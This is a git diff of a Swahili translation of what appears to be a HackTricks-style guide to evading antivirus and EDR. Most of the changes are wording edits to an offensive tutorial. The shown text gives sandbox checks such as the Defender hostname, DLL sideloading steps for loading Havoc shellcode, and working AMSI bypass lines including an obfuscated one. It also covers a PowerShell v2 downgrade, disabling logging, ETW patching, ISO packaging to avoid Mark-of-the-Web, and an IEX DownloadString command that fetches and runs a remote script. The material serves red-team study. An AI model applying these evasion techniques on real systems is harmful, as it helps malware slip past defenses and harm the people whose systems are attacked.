@@ -12,7 +12,7 @@
 
 ## **AV Evasion Methodology**
 
-Hivi sasa, AVs hutumia mbinu tofauti za kuangalia kama faili ni hatari au la, ugunduzi wa statiki, uchambuzi wa dynamic, na kwa EDRs za hali ya juu, uchambuzi wa tabia.
+Kwa sasa, AV hutumia mbinu tofauti za kuangalia kama faili ni hatari au la, ugunduzi wa statiki, uchambuzi wa dinamik, na kwa EDRs za hali ya juu, uchambuzi wa tabia.
 
 ### **Static detection**
 
@@ -20,7 +20,7 @@ Ugunduzi wa statiki unapatikana kwa kuweka alama kwenye nyuzi au safu za byte zi
 
 - **Encryption**
 
-Ikiwa unashughulikia binary, hakutakuwa na njia kwa AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili kufungua na kuendesha programu kwenye kumbukumbu.
+Ikiwa unashughulikia binary, hakutakuwa na njia kwa AV kugundua programu yako, lakini utahitaji aina fulani ya loader ili kufungua na kuendesha programu hiyo kwenye kumbukumbu.
 
 - **Obfuscation**
 
@@ -31,19 +31,19 @@ Wakati mwingine unachohitaji kufanya ni kubadilisha nyuzi fulani katika binary a
 Ikiwa unaunda zana zako mwenyewe, hakutakuwa na saini mbaya zinazojulikana, lakini hii inachukua muda na juhudi nyingi.
 
 > [!TIP]
-> Njia nzuri ya kuangalia dhidi ya ugunduzi wa statiki wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi inagawanya faili katika sehemu nyingi kisha inamwambia Defender kuchanganua kila moja kwa moja, kwa njia hii, inaweza kukuambia hasa ni zipi zenye alama mbaya katika binary yako.
+> Njia nzuri ya kuangalia dhidi ya ugunduzi wa statiki wa Windows Defender ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi inagawanya faili katika sehemu nyingi kisha inamwambia Defender kuchanganua kila moja kwa moja, kwa njia hii, inaweza kukuambia ni zipi zilizo na alama katika binary yako.
 
 Ninapendekeza uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion ya vitendo.
 
 ### **Dynamic analysis**
 
-Uchambuzi wa dynamic ni wakati AV inakimbiza binary yako kwenye sandbox na kuangalia shughuli hatari (mfano: kujaribu kufungua na kusoma nywila za kivinjari chako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo kadhaa unayoweza kufanya ili kuzuia sandboxes.
+Uchambuzi wa dinamik ni wakati AV inakimbia binary yako katika sandbox na kuangalia shughuli hatari (mfano: kujaribu kufungua na kusoma nywila za kivinjari chako, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu kidogo kufanya kazi nayo, lakini hapa kuna mambo kadhaa unayoweza kufanya ili kuzuia sandboxes.
 
-- **Sleep before execution** Kulingana na jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kupita uchambuzi wa dynamic wa AV. AVs zina muda mfupi sana wa kuchanganua faili ili zisihusishe na mtumiaji, hivyo kutumia usingizi mrefu kunaweza kuharibu uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza tu kupuuzia usingizi kulingana na jinsi ilivyotekelezwa.
-- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache sana za kufanya kazi (mfano: < 2GB RAM), vinginevyo zinaweza kuharibu mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia joto la CPU au hata kasi za mashabiki, si kila kitu kitawekwa kwenye sandbox.
+- **Sleep before execution** Kutegemea jinsi ilivyotekelezwa, inaweza kuwa njia nzuri ya kupita uchambuzi wa dinamik wa AV. AV zina muda mfupi sana wa kuchanganua faili ili zisihusishe na mtumiaji, hivyo kutumia usingizi mrefu kunaweza kuingilia uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza tu kupuuzia usingizi kulingana na jinsi ilivyotekelezwa.
+- **Checking machine's resources** Kawaida Sandboxes zina rasilimali chache sana za kufanya kazi (mfano: < 2GB RAM), vinginevyo zinaweza kuharibu mashine ya mtumiaji. Unaweza pia kuwa mbunifu sana hapa, kwa mfano kwa kuangalia joto la CPU au hata kasi za mashabiki, si kila kitu kitawekwa katika sandbox.
 - **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambaye kituo chake kimeunganishwa kwenye eneo la "contoso.local", unaweza kufanya ukaguzi kwenye eneo la kompyuta ili kuona kama linalingana na lile ulilosema, ikiwa halilingani, unaweza kufanya programu yako itoke.
 
-Inageuka kuwa jina la kompyuta la Microsoft Defender's Sandbox ni HAL9TH, hivyo, unaweza kuangalia jina la kompyuta katika malware yako kabla ya kulipua, ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sandbox ya defender, hivyo unaweza kufanya programu yako itoke.
+Inageuka kuwa jina la kompyuta la Sandbox la Microsoft Defender ni HAL9TH, hivyo, unaweza kuangalia jina la kompyuta katika malware yako kabla ya kulipua, ikiwa jina linalingana na HAL9TH, inamaanisha uko ndani ya sandbox ya defender, hivyo unaweza kufanya programu yako itoke.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>chanzo: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -55,18 +55,18 @@ Kama tulivyosema hapo awali katika chapisho hili, **zTools za umma** hatimaye **
 
 Kwa mfano, ikiwa unataka kudump LSASS, **je, unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi mwingine ambao haujulikani sana na pia unadump LSASS.
 
-Jibu sahihi labda ni la pili. Kuchukua mimikatz kama mfano, huenda ni moja ya, ikiwa si kipande cha malware kinachowekwa alama zaidi na AVs na EDRs, wakati mradi wenyewe ni mzuri sana, pia ni ndoto mbaya kufanya kazi nayo ili kuzunguka AVs, hivyo angalia tu mbadala kwa kile unachojaribu kufikia.
+Jibu sahihi labda ni la pili. Kuchukua mimikatz kama mfano, huenda ni moja ya, ikiwa si kipande cha malware kinachopigiwa kelele zaidi na AVs na EDRs, wakati mradi wenyewe ni mzuri sana, pia ni ndoto mbaya kufanya kazi nayo ili kuzunguka AVs, hivyo angalia tu mbadala kwa kile unachojaribu kufikia.
 
 > [!TIP]
-> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **unazima uwasilishaji wa sampuli kiotomatiki** katika defender, na tafadhali, kwa kweli, **USIWEKE KATIKA VIRUSTOTAL** ikiwa lengo lako ni kufikia evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagundulika na AV fulani, i-install kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, na uijaribu hapo hadi uridhike na matokeo.
+> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha **unazima uwasilishaji wa sampuli kiotomatiki** katika defender, na tafadhali, kwa dhati, **USIWEKE KATIKA VIRUSTOTAL** ikiwa lengo lako ni kufikia evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagundulika na AV fulani, i-install kwenye VM, jaribu kuzima uwasilishaji wa sampuli kiotomatiki, na uijaribu huko hadi uridhike na matokeo.
 
 ## EXEs vs DLLs
 
-Kila wakati inavyowezekana, daima **kipa kipaumbele kutumia DLLs kwa evasion**, katika uzoefu wangu, faili za DLL kwa kawaida **huzuiliwa kidogo** na kuchambuliwa, hivyo ni hila rahisi kutumia ili kuepuka kugundulika katika baadhi ya matukio (ikiwa payload yako ina njia yoyote ya kuendesha kama DLL bila shaka).
+Kila wakati inavyowezekana, daima **kipa kipaumbele kutumia DLLs kwa evasion**, katika uzoefu wangu, faili za DLL kwa kawaida **huzuiliwa kidogo** na kuchambuliwa, hivyo ni hila rahisi sana kutumia ili kuepuka kugundulika katika baadhi ya matukio (ikiwa payload yako ina njia yoyote ya kukimbia kama DLL bila shaka).
 
 Kama tunavyoona katika picha hii, Payload ya DLL kutoka Havoc ina kiwango cha kugundulika cha 4/26 katika antiscan.me, wakati payload ya EXE ina kiwango cha kugundulika cha 7/26.
 
-<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me kulinganisha payload ya kawaida ya Havoc EXE dhidi ya payload ya kawaida ya Havoc DLL</p></figcaption></figure>
+<figure><img src="../images/image (1130).png" alt=""><figcaption><p>kulinganisha antiscan.me ya payload ya kawaida ya Havoc EXE dhidi ya payload ya kawaida ya Havoc DLL</p></figcaption></figure>
 
 Sasa tutakuonyesha hila kadhaa unazoweza kutumia na faili za DLL ili kuwa na ufanisi zaidi.
 
@@ -83,7 +83,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 Amri hii itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.
 
-Ninapendekeza sana **uchunguze programu zinazoweza kuathiriwa na DLL Hijackable/Sideloadable mwenyewe**, mbinu hii ni ya siri sana ikiwa itafanywa vizuri, lakini ukitumia programu zinazojulikana za DLL Sideloadable, unaweza kukamatwa kwa urahisi.
+Ninapendekeza sana **uchunguze programu zinazoweza kuathiriwa na DLL Hijackable/Sideloadable mwenyewe**, mbinu hii ni ya siri sana ikiwa itafanywa vizuri, lakini ikiwa utatumia programu zinazojulikana za DLL Sideloadable, unaweza kukamatwa kwa urahisi.
 
 Kuweka tu DLL mbaya yenye jina ambalo programu inatarajia kupakia, haitapakia mzigo wako, kwani programu inatarajia kazi maalum ndani ya DLL hiyo, ili kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.
 
@@ -98,17 +98,15 @@ Hizi ndizo hatua nilizofuata:
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-Amri ya mwisho itatupa faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL iliyobadilishwa jina asilia.
+Amri ya mwisho itatupa faili 2: kiolezo cha msimbo wa chanzo cha DLL, na DLL iliyobadilishwa jina. 
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
 5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
 ```
-Hizi ndizo matokeo:
-
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Pamoja na shellcode yetu (iliyofichwa kwa [SGN](https://github.com/EgeBalci/sgn)) na DLL ya proxy ina kiwango cha Ugunduzi cha 0/26 katika [antiscan.me](https://antiscan.me)! Ningesema hiyo ni mafanikio.
+Mbili shellcode zetu (zilizoandikwa kwa [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha Ugunduzi cha 0/26 katika [antiscan.me](https://antiscan.me)! Ningesema hiyo ni mafanikio.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
@@ -117,7 +115,7 @@ Pamoja na shellcode yetu (iliyofichwa kwa [SGN](https://github.com/EgeBalci/sgn)
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
-`Freeze ni zana ya payload kwa ajili ya kupita EDRs kwa kutumia michakato iliyositishwa, syscalls za moja kwa moja, na mbinu mbadala za utekelezaji`
+`Freeze ni toolkit ya payload kwa ajili ya kupita EDRs kwa kutumia michakato iliyositishwa, syscalls za moja kwa moja, na mbinu mbadala za utekelezaji`
 
 Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
 ```
@@ -129,11 +127,11 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Evasion ni mchezo wa paka na panya, kile kinachofanya kazi leo kinaweza kugunduliwa kesho, hivyo usitegemee zana moja tu, ikiwa inawezekana, jaribu kuunganisha mbinu kadhaa za kuepuka.
+> Evasion ni mchezo wa paka na panya, kile kinachofanya kazi leo kinaweza kugundulika kesho, hivyo usitegemee zana moja tu, ikiwa inawezekana, jaribu kuunganisha mbinu kadhaa za kuepuka.
 
 ## AMSI (Anti-Malware Scan Interface)
 
-AMSI ilianzishwa ili kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs zilikuwa na uwezo wa kuchunguza **faili kwenye diski**, hivyo ikiwa ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja katika kumbukumbu**, AV haingeweza kufanya chochote kuzuia hilo, kwani haikuwa na mwonekano wa kutosha.
+AMSI ilianzishwa ili kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs zilikuwa na uwezo wa kuchanganua **faili kwenye diski**, hivyo ikiwa ungeweza kwa namna fulani kutekeleza payloads **moja kwa moja katika kumbukumbu**, AV haingeweza kufanya chochote kuzuia hilo, kwani haikuwa na mwonekano wa kutosha.
 
 Kipengele cha AMSI kimejumuishwa katika sehemu hizi za Windows.
 
@@ -143,9 +141,9 @@ Kipengele cha AMSI kimejumuishwa katika sehemu hizi za Windows.
 - JavaScript na VBScript
 - Office VBA macros
 
-Inaruhusu suluhisho za antivirus kuchunguza tabia ya script kwa kufichua maudhui ya script katika mfumo ambao haujaandikwa na haujaeleweka.
+Inaruhusu suluhisho za antivirus kuchunguza tabia ya script kwa kufichua maudhui ya script katika mfumo ambao haujaandikwa na haujawekwa wazi.
 
-Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha arifa ifuatayo kwenye Windows Defender.
+Kukimbia `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutazalisha onyo lifuatalo kwenye Windows Defender.
 
 <figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>
 
@@ -161,15 +159,15 @@ Kuna njia kadhaa za kuzunguka AMSI:
 
 Kwa kuwa AMSI inafanya kazi hasa na kugundua kwa statiki, hivyo, kubadilisha scripts unazojaribu kupakia inaweza kuwa njia nzuri ya kuepuka kugunduliwa.
 
-Hata hivyo, AMSI ina uwezo wa kufichua scripts hata ikiwa ina tabaka kadhaa, hivyo obfuscation inaweza kuwa chaguo mbaya kulingana na jinsi inavyofanywa. Hii inafanya kuwa si rahisi kuepuka. Ingawa, wakati mwingine, unachohitaji kufanya ni kubadilisha majina kadhaa ya mabadiliko na utakuwa sawa, hivyo inategemea ni kiasi gani kitu kimewekwa alama.
+Hata hivyo, AMSI ina uwezo wa kufichua scripts hata ikiwa na tabaka kadhaa, hivyo obfuscation inaweza kuwa chaguo mbaya kulingana na jinsi inavyofanywa. Hii inafanya kuwa si rahisi kuepuka. Ingawa, wakati mwingine, unachohitaji kufanya ni kubadilisha majina kadhaa ya mabadiliko na utakuwa sawa, hivyo inategemea ni kiasi gani kitu kimewekwa alama.
 
 - **AMSI Bypass**
 
-Kwa kuwa AMSI inatekelezwa kwa kupakia DLL katika mchakato wa powershell (pia cscript.exe, wscript.exe, nk), inawezekana kuingilia kati kwa urahisi hata ukiwa kama mtumiaji asiye na mamlaka. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia kadhaa za kuepuka skanning ya AMSI.
+Kwa kuwa AMSI inatekelezwa kwa kupakia DLL katika mchakato wa powershell (pia cscript.exe, wscript.exe, nk), inawezekana kuingilia kati kwa urahisi hata ukiwa kama mtumiaji asiye na haki. Kutokana na kasoro hii katika utekelezaji wa AMSI, watafiti wamegundua njia kadhaa za kuepuka skanning ya AMSI.
 
-**Kulazimisha Kosa**
+**Kusababisha Kosa**
 
-Kulazimisha kuanzishwa kwa AMSI kufeli (amsiInitFailed) kutasababisha kwamba hakuna skanning itakayofanywa kwa mchakato wa sasa. Awali hii ilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ili kuzuia matumizi makubwa.
+Kusababisha kuanzishwa kwa AMSI kufeli (amsiInitFailed) kutasababisha kwamba hakuna skanning itakayofanywa kwa mchakato wa sasa. Awali hii ilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ili kuzuia matumizi makubwa.
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
@@ -189,40 +187,40 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
+Kumbuka, kwamba hii itakuwa na uwezekano wa kuangaziwa mara hii chapisho litakapochapishwa, hivyo usichapishe msimbo ikiwa mpango wako ni kubaki bila kugundulika.
 
 **Memory Patching**
 
-H technique hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inayohusika na kusanifu ingizo lililotolewa na mtumiaji) na kuandika tena na maagizo ya kurudisha msimbo wa E_INVALIDARG, kwa njia hii, matokeo ya skana halisi yatarudisha 0, ambayo inatafsiriwa kama matokeo safi.
+Tekniki hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya kazi "AmsiScanBuffer" katika amsi.dll (inayohusika na kusanifu ingizo lililotolewa na mtumiaji) na kuandika tena na maagizo ya kurudisha msimbo wa E_INVALIDARG, kwa njia hii, matokeo ya skana halisi yatarudisha 0, ambayo inatafsiriwa kama matokeo safi.
 
 > [!TIP]
 > Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo zaidi.
 
-Kuna pia mbinu nyingi nyingine zinazotumika kupita AMSI kwa kutumia powershell, angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu hizo.
+Pia kuna mbinu nyingi nyingine zinazotumika kupita AMSI kwa kutumia powershell, angalia [**hii ukurasa**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**hii repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) kujifunza zaidi kuhusu hizo.
 
 Zana hii [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) pia inazalisha skripti za kupita AMSI.
 
-**Remove the detected signature**
+**Ondoa saini iliyogundulika**
 
-Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogunduliwa kutoka kwenye kumbukumbu ya mchakato wa sasa. Zana hii inafanya kazi kwa kusanifu kumbukumbu ya mchakato wa sasa kwa saini ya AMSI na kisha kuandika tena na maagizo ya NOP, kwa ufanisi kuondoa kutoka kwenye kumbukumbu.
+Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyogundulika kutoka kwenye kumbukumbu ya mchakato wa sasa. Zana hii inafanya kazi kwa kusanifu kumbukumbu ya mchakato wa sasa kwa saini ya AMSI na kisha kuandika tena na maagizo ya NOP, kwa ufanisi kuondoa kutoka kwenye kumbukumbu.
 
-**AV/EDR products that uses AMSI**
+**Bidhaa za AV/EDR zinazotumia AMSI**
 
 Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
 
-**Use Powershell version 2**
-Ikiwa unatumia PowerShell toleo la 2, AMSI haitapakiwa, hivyo unaweza kuendesha skripti zako bila kusanifiwa na AMSI. Unaweza kufanya hivi:
+**Tumia toleo la Powershell 2**
+Ikiwa unatumia toleo la PowerShell 2, AMSI haitapakiwa, hivyo unaweza kuendesha skripti zako bila kusanifiwa na AMSI. Unaweza kufanya hivi:
 ```bash
 powershell.exe -version 2
 ```
 ## PS Logging
 
-PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa na manufaa kwa ajili ya ukaguzi na kutatua matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kuepuka kugundulika**.
+PowerShell logging ni kipengele kinachokuruhusu kuandika amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa na manufaa kwa ajili ya ukaguzi na kutatua matatizo, lakini pia inaweza kuwa **tatizo kwa washambuliaji wanaotaka kuepuka kugundulika**.
 
 Ili kupita PowerShell logging, unaweza kutumia mbinu zifuatazo:
 
 - **Zima PowerShell Transcription na Module Logging**: Unaweza kutumia chombo kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa ajili ya hili.
-- **Tumia PowerShell toleo la 2**: Ikiwa unatumia PowerShell toleo la 2, AMSI haitapakiwa, hivyo unaweza kuendesha skripti zako bila kuskenwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
+- **Tumia PowerShell toleo la 2**: Ikiwa unatumia PowerShell toleo la 2, AMSI haitapakiwa, hivyo unaweza kuendesha skripti zako bila kuskanwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
 - **Tumia Sehemu ya PowerShell Isiyo na Usimamizi**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha PowerShell bila ulinzi (hii ndiyo inatumika na `powerpick` kutoka Cobalt Strike).
 
 ## Obfuscation
@@ -232,16 +230,16 @@ Ili kupita PowerShell logging, unaweza kutumia mbinu zifuatazo:
 
 Kuna zana kadhaa ambazo zinaweza kutumika ku **obfuscate C# clear-text code**, kuunda **metaprogramming templates** za kukusanya binaries au **obfuscate compiled binaries** kama vile:
 
-- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): Ni obfuscator mzuri ya chanzo wazi kwa programu za .NET. Inatoa mbinu mbalimbali za ulinzi kama vile obfuscation ya mtiririko wa kudhibiti, anti-debugging, anti-tampering, na encryption ya maandiko. Inapendekezwa kwa sababu inaruhusu hata obfuscate sehemu maalum za msimbo.
+- [**ConfuserEx**](https://github.com/yck1509/ConfuserEx): Ni obfuscator mzuri ya chanzo wazi kwa ajili ya programu za .NET. Inatoa mbinu mbalimbali za ulinzi kama vile obfuscation ya mtiririko wa kudhibiti, anti-debugging, anti-tampering, na encryption ya nyuzi. Inapendekezwa kwa sababu inaruhusu hata obfuscate sehemu maalum za msimbo.
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
 - [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo wazi ya [LLVM](http://www.llvm.org/) suite ya kukusanya inayoweza kutoa usalama wa programu ulioongezeka kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia mabadiliko.
 - [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia lugha ya `C++11/14` kuunda, wakati wa kukusanya, msimbo uliofichwa bila kutumia chombo chochote cha nje na bila kubadilisha mkusanyaji.
 - [**obfy**](https://github.com/fritzone/obfy): Ongeza safu ya operesheni zilizofichwa zinazozalishwa na mfumo wa metaprogramming wa C++ template ambao utaifanya maisha ya mtu anayetaka kuvunja programu kuwa magumu kidogo.
 - [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni obfuscator ya binary x64 inayoweza kuficha aina mbalimbali za faili za pe ikiwa ni pamoja na: .exe, .dll, .sys
-- [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya metamorphic code kwa executable zisizo na mipaka.
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa obfuscation wa msimbo wa kiwango kidogo kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (return-oriented programming). ROPfuscator inaficha programu kwenye kiwango cha msimbo wa mkusanyiko kwa kubadilisha maagizo ya kawaida kuwa ROP chains, ikizuia dhana yetu ya kawaida ya mtiririko wa kudhibiti.
+- [**metame**](https://github.com/a0rtega/metame): Metame ni injini rahisi ya metamorphic code kwa ajili ya executable zisizo na mipaka.
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni mfumo wa obfuscation wa msimbo wa kiwango cha juu kwa lugha zinazoungwa mkono na LLVM kwa kutumia ROP (return-oriented programming). ROPfuscator inaficha programu kwenye kiwango cha msimbo wa mkusanyiko kwa kubadilisha maagizo ya kawaida kuwa ROP chains, ikizuia dhana yetu ya kawaida ya mtiririko wa kudhibiti.
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyoandikwa kwa Nim
-- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuziweka
+- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor ina uwezo wa kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuzipeleka
 
 ## SmartScreen & MoTW
 
@@ -258,13 +256,13 @@ SmartScreen inafanya kazi hasa kwa njia ya msingi wa sifa, ikimaanisha kwamba pr
 <figure><img src="../images/image (237).png" alt=""><figcaption><p>Kukagua Zone.Identifier ADS kwa faili iliyoshushwa kutoka mtandao.</p></figcaption></figure>
 
 > [!TIP]
-> Ni muhimu kutambua kwamba executable zilizosainiwa kwa cheti cha **kuaminika** **hazitazindua SmartScreen**.
+> Ni muhimu kutambua kwamba executable zilizosainiwa kwa cheti cha **kuaminika** **hazitaanzisha SmartScreen**.
 
 Njia yenye ufanisi sana ya kuzuia payloads zako kupata Mark of The Web ni kwa kuzifunga ndani ya aina fulani ya kontena kama ISO. Hii inatokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa **volumes zisizo za NTFS**.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni chombo kinachofunga payloads katika kontena za matokeo ili kuepuka Mark-of-the-Web.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni chombo kinachofunga payloads ndani ya kontena za matokeo ili kuepuka Mark-of-the-Web.
 
 Mfano wa matumizi:
 ```bash
@@ -296,15 +294,15 @@ Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files 
 
 Event Tracing for Windows (ETW) ni mekanizma yenye nguvu ya kurekodi katika Windows inayoruhusu programu na vipengele vya mfumo **kurekodi matukio**. Hata hivyo, inaweza pia kutumika na bidhaa za usalama kufuatilia na kugundua shughuli mbaya.
 
-Kama ilivyo kwa jinsi AMSI inavyoweza kuzuiwa (kuzidiwa), pia inawezekana kufanya kazi ya **`EtwEventWrite`** ya mchakato wa nafasi ya mtumiaji irejee mara moja bila kurekodi matukio yoyote. Hii inafanywa kwa kubadilisha kazi hiyo katika kumbukumbu ili irejee mara moja, kwa ufanisi ikizuiya kurekodi ETW kwa mchakato huo.
+Kama ilivyo kwa jinsi AMSI inavyoweza kuzuiwa (kuzidiwa), pia inawezekana kufanya **`EtwEventWrite`** kazi ya mchakato wa nafasi ya mtumiaji irejee mara moja bila kurekodi matukio yoyote. Hii inafanywa kwa kubadilisha kazi hiyo katika kumbukumbu ili irejee mara moja, kwa ufanisi ikizuiya kurekodi ETW kwa mchakato huo.
 
-Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
+Unaweza kupata maelezo zaidi katika **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) na [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
 
 ## C# Assembly Reflection
 
-Kuingiza binaries za C# katika kumbukumbu kumekuwa kukijulikana kwa muda mrefu na bado ni njia nzuri sana ya kuendesha zana zako za baada ya unyakuzi bila kukamatwa na AV.
+Kuingiza binaries za C# katika kumbukumbu kumekuwa kujulikana kwa muda mrefu na bado ni njia nzuri sana ya kuendesha zana zako za baada ya unyakuzi bila kukamatwa na AV.
 
-Kwa kuwa payload itapakiwa moja kwa moja kwenye kumbukumbu bila kugusa diski, tutahitaji tu kuwa na wasiwasi kuhusu kubadilisha AMSI kwa mchakato mzima.
+Kwa kuwa payload itapakiwa moja kwa moja katika kumbukumbu bila kugusa diski, tutahitaji tu kuwa na wasiwasi kuhusu kubadilisha AMSI kwa mchakato mzima.
 
 Mifumo mingi ya C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, nk.) tayari inatoa uwezo wa kutekeleza makusanyo ya C# moja kwa moja katika kumbukumbu, lakini kuna njia tofauti za kufanya hivyo:
 
@@ -316,7 +314,7 @@ Inahusisha **kuanzisha mchakato mpya wa dhabihu**, ingiza msimbo wako mbaya wa b
 
 - **Inline**
 
